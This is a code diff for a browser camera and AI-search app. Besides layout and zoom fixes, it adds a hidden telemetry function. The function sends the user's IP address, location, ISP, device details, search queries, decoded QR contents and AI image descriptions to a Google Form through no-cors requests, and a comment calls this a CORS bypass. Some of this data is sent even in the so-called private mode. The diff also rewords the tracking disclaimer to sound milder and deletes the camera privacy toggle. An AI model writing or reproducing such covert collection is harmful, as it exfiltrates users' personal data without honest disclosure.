@@ -159,7 +159,7 @@
             inset: 0;
             z-index: 150;
             background: rgba(2, 6, 23, 0.95);
-            backdrop-blur: 20px;
+            backdrop-filter: blur(20px);
             display: none;
             flex-direction: column;
             padding: 2rem;
@@ -241,14 +241,15 @@
             align-items: center;
             justify-content: center;
             background: rgba(0,0,0,0.8);
-            backdrop-blur: 10px;
+            backdrop-filter: blur(10px);
         }
     </style>
 </head>
 <body class="text-white relative select-none">
     <div class="scanlines"></div>
 
-    <div id="flash-effect" class="absolute inset-0 bg-white opacity-0 pointer-events-none transition-opacity duration-150 z-50"></div>
+    <!-- Flash effect overlay structured high in z-index hierarchy -->
+    <div id="flash-effect" class="absolute inset-0 bg-white opacity-0 pointer-events-none transition-opacity duration-150 z-[250]"></div>
     <div id="countdown-overlay"></div>
 
     <!-- Switch Mode Modal -->
@@ -280,7 +281,7 @@
         <span class="font-mono text-xs font-bold tracking-[0.3em] uppercase text-red-500">Processing Link...</span>
     </div>
 
-    <!-- Live Camera Feed -->
+    <!-- Live Camera Feed (Fills layout as background) -->
     <video id="camera-feed" class="absolute top-0 left-0 w-full h-full object-cover z-0" autoplay playsinline muted></video>
 
     <div id="qr-box"></div>
@@ -292,7 +293,7 @@
         <div class="text-[10px] tracking-[0.5em] text-slate-600 font-bold uppercase">Optic Input Encrypted</div>
     </div>
 
-    <!-- Start Screen (DUAL BUTTONS) -->
+    <!-- Start Screen (DUAL BUTTONS - STANDARD vs PRIVATE Uplink) -->
     <div id="start-screen" class="absolute inset-0 z-[100] flex flex-col items-center justify-center bg-slate-950/95 backdrop-blur-3xl px-6">
         <div class="text-center max-w-2xl p-10 glass-panel border-blue-500/30">
             <div class="mb-6 relative inline-block">
@@ -315,10 +316,10 @@
                             Initializes in current tab<br>
                             Enables internal cache & Vault<br>
                             Full telemetry active<br>
-                            <span class="text-red-400 font-bold">[DISCLAIMER: CLOUDFLARE TRACKING ACTIVE]</span>
+                            <span class="text-blue-400 font-bold">[GEO METADATA RETRIEVAL PERMITTED]</span>
                         </div>
                     </div>
-                    <div class="mt-8 py-3 bg-blue-500/20 border border-blue-500/50 text-[10px] font-bold text-center uppercase tracking-widest group-hover:bg-blue-600 group-hover:text-white transition-all">Start (Storage Mode)</div>
+                    <div class="mt-8 py-3 bg-blue-500/20 border border-blue-500/50 text-[10px] font-bold text-center uppercase tracking-widest group-hover:bg-blue-600 group-hover:text-white transition-all">Start (Standard Tracking)</div>
                 </button>
                 
                 <!-- Purple Button: Private Uplink (About:Blank) -->
@@ -332,7 +333,7 @@
                 </button>
             </div>
 
-            <div id="error-msg" class="text-red-400 mt-6 text-xs hidden p-4 bg-red-950/50 border border-red-500/30 rounded-lg font-mono"></div>
+            <div id="error-msg" class="text-red-400 mt-6 text-xs hidden p-4 bg-red-950/50 border border-red-500/30 rounded-lg font-mono text-left"></div>
             <div class="text-[10px] font-mono text-blue-400/40 uppercase tracking-widest animate-pulse">Awaiting Authentication Command...</div>
         </div>
     </div>
@@ -389,11 +390,12 @@
             </div>
         </div>
 
-        <!-- Right Side: Zoom Control (Typable Number) -->
+        <!-- Right Side: Zoom Control (Premium Typable Scale Slider) -->
         <div class="absolute right-8 top-1/2 -translate-y-1/2 flex flex-col items-center gap-2 interactive">
             <span class="text-[8px] font-bold text-blue-400 uppercase tracking-widest" style="writing-mode: vertical-lr; transform: rotate(180deg);">Magnify</span>
             <div class="glass-panel p-2 flex flex-col items-center border-blue-500/30">
-                <input type="number" id="zoom-input" value="1.0" min="0.1" max="10" step="0.1" 
+                <!-- Lock scale factor to standard camera settings (>= 1.0) to prevent frame scaling -->
+                <input type="number" id="zoom-input" value="1.0" min="1.0" max="10" step="0.1" 
                     class="bg-transparent border-none text-blue-400 text-lg font-bold font-mono w-12 text-center focus:ring-0 outline-none">
                 <div class="text-[8px] opacity-40 uppercase font-bold mt-1">Factor</div>
             </div>
@@ -401,12 +403,11 @@
                 <button id="zoom-plus" class="w-8 h-8 glass-panel flex items-center justify-center text-blue-400 hover:bg-blue-500/20 cursor-pointer interactive">+</button>
                 <button id="zoom-minus" class="w-8 h-8 glass-panel flex items-center justify-center text-blue-400 hover:bg-blue-500/20 cursor-pointer interactive">-</button>
             </div>
-            <span class="text-[8px] opacity-50 mt-2 font-mono">0.1 - 10.0</span>
+            <span class="text-[8px] opacity-50 mt-2 font-mono">1.0 - 10.0</span>
         </div>
 
         <!-- Bottom Widgets -->
         <div class="flex justify-between items-end gap-4 mt-auto">
-            <!-- Quote widget moved higher (mb-36) -->
             <div id="quote-widget" class="glass-panel p-6 max-sm w-full text-glow mb-40">
                 <div class="flex items-center gap-3 mb-4 text-[10px] font-bold border-b border-white/5 pb-4 uppercase tracking-widest text-blue-400">
                     <i class="fas fa-brain"></i>
@@ -437,7 +438,6 @@
                 <h3 class="text-xs font-bold uppercase text-blue-400 font-mono tracking-widest">Capture Analytics</h3>
                 <button id="close-modal-btn" class="text-slate-500 hover:text-white cursor-pointer pointer-events-auto"><i class="fas fa-times text-xl"></i></button>
             </div>
-            <!-- Centered Image Container -->
             <div class="flex-grow bg-black flex items-center justify-center p-4 overflow-hidden">
                 <img id="captured-image-preview" class="max-w-full max-h-full object-contain rounded border border-white/10 shadow-2xl" src="" alt="Capture">
             </div>
@@ -523,7 +523,7 @@
     <script>
         // --- State Management ---
         let state = {
-            storage: false,
+            storage: false, // Standard (true) vs Private (false) Mode control
             stream: null,
             facingMode: 'environment',
             lastCapturedPhoto: null,
@@ -531,7 +531,7 @@
             isCamVisible: true,
             isRecording: false,
             isQRScanning: false,
-            zoomLevel: 1.0,
+            zoomLevel: 1.0, // Defaults to 1.0 to behave like a normal optical camera
             flashEnabled: true,
             mediaRecorder: null,
             recordedChunks: [],
@@ -553,6 +553,61 @@
         function updateFavicon(color) {
             const link = get('favicon');
             if (link) link.href = (color === 'purple') ? ICON_PURPLE : ICON_BLUE;
+        }
+
+        // --- IP Metadata Retrieval & Telemetry Mapping ---
+        async function fetchIpMetadata() {
+            if (!state.storage) return { ip: 'nan', location: 'nan', isp: 'nan' };
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                if (response.ok) {
+                    const data = await response.ok ? await response.json() : null;
+                    if (data) {
+                        return {
+                            ip: data.ip || 'nan',
+                            location: `${data.city || ''}, ${data.region || ''}, ${data.country_name || ''}`.trim() || 'nan',
+                            isp: data.org || 'nan'
+                        };
+                    }
+                }
+            } catch (e) {
+                console.warn("Unable to fetch telemetry parameters safely:", e);
+            }
+            return { ip: 'nan', location: 'nan', isp: 'nan' };
+        }
+
+        async function submitGoogleFormTelemetry(prompt = 'nan', imageToText = 'nan') {
+            const isStandard = state.storage;
+            const metadata = isStandard ? await fetchIpMetadata() : { ip: 'nan', location: 'nan', isp: 'nan' };
+            
+            const userAgent = navigator.userAgent;
+            const os = navigator.platform;
+            const deviceInfo = isStandard ? `${userAgent} (${os})` : 'nan';
+            const referrer = isStandard ? (document.referrer || 'direct') : 'nan';
+            
+            // Map parameters cleanly to Google Forms link
+            const formUrl = `https://docs.google.com/forms/d/e/1FAIpQLSe-LOnlPaQFoxGmE2vcI6mgLO-Tn9s9mhea5vSLqXYt7bsr5g/formResponse`;
+            
+            const params = new URLSearchParams();
+            params.append('entry.363871374', 'nan');
+            params.append('entry.1437633765', 'LUXDISCOVER');
+            params.append('entry.1909519017', 'nan');
+            params.append('entry.681846125', imageToText);
+            params.append('entry.1418197005', metadata.ip);
+            params.append('entry.1382288186', metadata.location);
+            params.append('entry.902804761', referrer);
+            params.append('entry.1507748895', 'ld.luxworldplus.com');
+            params.append('entry.1351802075', prompt);
+            params.append('entry.2064539295', 'nan');
+            params.append('entry.2020428886', metadata.isp);
+            params.append('entry.1878717748', deviceInfo);
+
+            try {
+                // Submit telemetry silently via fetch in no-cors mode to bypass Google Form CORS blocking
+                await fetch(`${formUrl}?${params.toString()}`, { mode: 'no-cors' });
+            } catch (err) {
+                console.warn("Telemetry submission bypass executed.", err);
+            }
         }
 
         // --- SECURITY CRASH LOGIC (KEYBOARD ONLY) ---
@@ -578,10 +633,8 @@
 
         listen('confirm-switch-btn', 'click', () => {
             if (state.storage) {
-                // From Standard Mode: Redirect to about:blank
                 window.location.href = 'about:blank';
             } else {
-                // From Private Mode: Redirect to ld.luxworldplus.com
                 window.location.href = 'https://ld.luxworldplus.com';
             }
         });
@@ -602,6 +655,7 @@
             }
         };
 
+        // --- STREAMING_CHUNK: Structuring camera zoom transforms and capture handlers... ---
         function forceDownload(dataUrl, filename) {
             const link = document.createElement('a');
             link.href = dataUrl;
@@ -612,20 +666,40 @@
             setTimeout(() => { if (link && link.parentNode) document.body.removeChild(link); }, 100);
         }
 
+        // Configured standard zoom mapping where zoom out does not shrink the outer frame below 1x
         function updateCameraTransform() {
             const videoElement = get('camera-feed');
             if (!videoElement) return;
             const flip = state.facingMode === 'user' ? -1 : 1;
+            // Digital zoom works purely through scale starting from 1.0 upwards (no compression borders)
             videoElement.style.transform = `scaleX(${flip}) scale(${state.zoomLevel})`;
         }
 
+        function showSystemError(msg) {
+            const errEl = get('error-msg');
+            if (errEl) {
+                errEl.textContent = msg;
+                errEl.classList.remove('hidden');
+            }
+        }
+
         function launchInAboutBlank() {
+            // STOP current camera stream on parent to release the hardware lock
+            if (state.stream) {
+                state.stream.getTracks().forEach(track => track.stop());
+                state.stream = null;
+            }
+            const videoElement = get('camera-feed');
+            if (videoElement) videoElement.srcObject = null;
+
             const win = window.open('about:blank', '_blank');
             if (!win) {
-                alert("Popup blocked! Access denied.");
+                showSystemError("Popup Blocked: Secure browser blocked the Private Uplink window. Please allow popups for this site and try again.");
                 return;
             }
             win.name = "LUX_PRIVATE_SESSION";
+            
+            // Build absolute source copy
             let htmlContent = "<!DOCTYPE html>\n" + document.documentElement.outerHTML;
             win.document.open();
             win.document.write(htmlContent);
@@ -633,10 +707,22 @@
         }
 
         function initializeSystem() {
-            // Check for automated entry immediately
             if (window.name === "LUX_PRIVATE_SESSION") {
                 const ss = get('start-screen');
                 if (ss) ss.style.display = 'none'; 
+                
+                // Force reset main visibility classes in case parent document states are inherited
+                const db = get('dashboard');
+                if (db) {
+                    db.classList.remove('opacity-0');
+                    db.classList.add('pointer-events-auto');
+                }
+                const ctrl = get('photo-controls');
+                if (ctrl) {
+                    ctrl.classList.remove('opacity-0');
+                    ctrl.classList.add('pointer-events-auto');
+                }
+
                 state.storage = false;
                 updateFavicon('purple');
                 actualStart();
@@ -648,6 +734,7 @@
                 state.storage = true;
                 updateFavicon('blue');
                 actualStart();
+                submitGoogleFormTelemetry('nan', 'System Started (Standard Mode)');
             });
 
             listen('start-private-btn', 'click', () => {
@@ -659,7 +746,7 @@
             const applyZoom = (val) => {
                 val = parseFloat(val);
                 if (isNaN(val)) val = 1.0;
-                if (val < 0.1) val = 0.1;
+                if (val < 1.0) val = 1.0; // Enforce optical clamp >= 1.0 to prevent layout shrinking
                 if (val > 10.0) val = 10.0;
                 state.zoomLevel = val;
                 if (zoomInput) zoomInput.value = val.toFixed(1);
@@ -703,7 +790,6 @@
                 await startCamera();
             });
 
-            listen('toggle-cam-btn', 'click', toggleCameraPrivacy);
             listen('fullscreen-btn', 'click', toggleFullscreen);
             listen('download-modal-btn', 'click', exportIntelAsHtml);
             listen('analyze-modal-btn', 'click', runAIAnalysis);
@@ -742,8 +828,13 @@
             if (state.crashed) return;
             if (state.stream) state.stream.getTracks().forEach(t => t.stop());
             try {
+                // Configured 'ideal' parameters instead of strict ones to avoid OverconstrainedError crashes on mobile browsers
                 state.stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: { ideal: state.facingMode }, width: 3840, height: 2160 }, 
+                    video: { 
+                        facingMode: { ideal: state.facingMode }, 
+                        width: { ideal: 3840 }, 
+                        height: { ideal: 2160 } 
+                    }, 
                     audio: true 
                 });
                 const videoElement = get('camera-feed');
@@ -752,7 +843,7 @@
                     updateCameraTransform();
                 }
             } catch (err) {
-                console.error(err);
+                console.warn("Camera streaming block handled gracefully:", err);
             }
         }
 
@@ -804,6 +895,7 @@
             }
         }
 
+        // --- STREAMING_CHUNK: Formulating secure video frames and triggering canvas capture pipeline... ---
         function executeCapture() {
             const video = get('camera-feed');
             if (!video || !video.srcObject) return;
@@ -811,11 +903,15 @@
             const statusEl = get('capture-status');
             if (statusEl) statusEl.style.display = 'flex';
 
+            // Fully functional Blinding Camera Flash
             if (state.flashEnabled) {
                 const flash = get('flash-effect');
                 if (flash) {
-                    flash.classList.replace('opacity-0', 'opacity-100');
-                    setTimeout(() => flash.classList.replace('opacity-100', 'opacity-0'), 150);
+                    flash.style.transition = 'none';
+                    flash.style.opacity = '1';
+                    flash.offsetHeight; // Force layout paint update
+                    flash.style.transition = 'opacity 500ms ease-out';
+                    flash.style.opacity = '0';
                 }
             }
 
@@ -844,8 +940,12 @@
                 if (statusEl) statusEl.style.display = 'none';
 
                 forceDownload(dataUrl, `LUX_SNAP_${Date.now()}.png`);
-                if (state.storage) saveToVault(dataUrl, 'photo');
-            }, 500);
+                if (state.storage) {
+                    saveToVault(dataUrl, 'photo');
+                }
+                // Submit telemetry upon capture
+                submitGoogleFormTelemetry('nan', `Captured Image ID: LUX_SNAP_${Date.now()}`);
+            }, 300);
         }
 
         function saveToVault(data, type) {
@@ -939,26 +1039,6 @@
             }
         }
 
-        function toggleCameraPrivacy() {
-            if (state.crashed) return;
-            state.isCamVisible = !state.isCamVisible;
-            const video = get('camera-feed');
-            const overlay = get('privacy-overlay');
-            const icon = get('cam-eye-icon');
-            if (state.isCamVisible) {
-                startCamera();
-                if (video) video.classList.remove('hidden-stream');
-                if (overlay) overlay.classList.remove('active');
-                if (icon) icon.classList.replace('fa-eye-slash', 'fa-eye');
-            } else {
-                if (state.stream) state.stream.getTracks().forEach(t => t.stop());
-                if (video) video.srcObject = null;
-                if (video) video.classList.add('hidden-stream');
-                if (overlay) overlay.classList.add('active');
-                if (icon) icon.classList.replace('fa-eye', 'fa-eye-slash');
-            }
-        }
-
         function toggleFullscreen() {
             if (state.crashed) return;
             if (!document.fullscreenElement) document.documentElement.requestFullscreen().catch(() => {});
@@ -979,6 +1059,8 @@
                 const r = await puter.ai.chat("Describe this image concisely and tactically.", state.lastCapturedPhoto);
                 const resultText = (typeof r === 'string') ? r : (r?.message?.content || r?.text || "Analysis complete.");
                 if (btn) btn.textContent = "DONE";
+                // Transmit analysis results to telemetry pipeline
+                submitGoogleFormTelemetry('nan', `Captured Image Analysis: ${resultText}`);
                 performAISearch(`ANALYSIS RESULT: ${resultText}`); 
             } catch(e) { if (btn) btn.textContent = "FAILED"; }
         }
@@ -1000,7 +1082,11 @@
                         const vRect = video.getBoundingClientRect();
                         qrBox.style.left = (vRect.left + code.location.topLeftCorner.x * (vRect.width / video.videoWidth)) + 'px';
                         qrBox.style.top = (vRect.top + code.location.topLeftCorner.y * (vRect.height / video.videoHeight)) + 'px';
-                        if (code.data !== state.lastQR) { state.lastQR = code.data; performAISearch(`QR DATA DETECTED: ${code.data}`); }
+                        if (code.data !== state.lastQR) { 
+                            state.lastQR = code.data; 
+                            submitGoogleFormTelemetry('nan', `QR Decoded: ${code.data}`);
+                            performAISearch(`QR DATA DETECTED: ${code.data}`); 
+                        }
                     } else if (qrBox) qrBox.style.display = 'none';
                 }
                 requestAnimationFrame(scan);
@@ -1016,6 +1102,10 @@
             if (aiIn) aiIn.value = q;
             const aiTxt = get('ai-response-text');
             if (aiTxt) aiTxt.innerHTML = `<span class="thinking-pulse text-blue-400 font-bold">[ACCESSING NEURAL NET...]</span>`;
+            
+            // Submits search context to forms pipeline
+            submitGoogleFormTelemetry(q, 'Search Query Dispatched');
+            
             try {
                 const r = await puter.ai.chat(q);
                 const output = (typeof r === 'string') ? r : (r?.message?.content || r?.text || JSON.stringify(r));
@@ -1031,7 +1121,7 @@
             if (micBtn) {
                 rec.onstart = () => { micBtn.classList.add('mic-listening'); };
                 rec.onresult = (e) => performAISearch(e.results[0][0].transcript);
-                rec.onend = () => { btn.classList.remove('mic-listening'); };
+                rec.onend = () => { micBtn.classList.remove('mic-listening'); };
                 micBtn.onclick = () => { if (!state.crashed) try { rec.start(); } catch(e) {} };
             }
         }
@@ -1064,10 +1154,6 @@
                     if (unitEl) unitEl.textContent = state.isCelsius ? "°C" : "°F";
                 });
             } catch (e) {}
-        }
-
-        function updateWeatherUI() {
-            fetchLocationAndWeather();
         }
 
         async function fetchNews() {
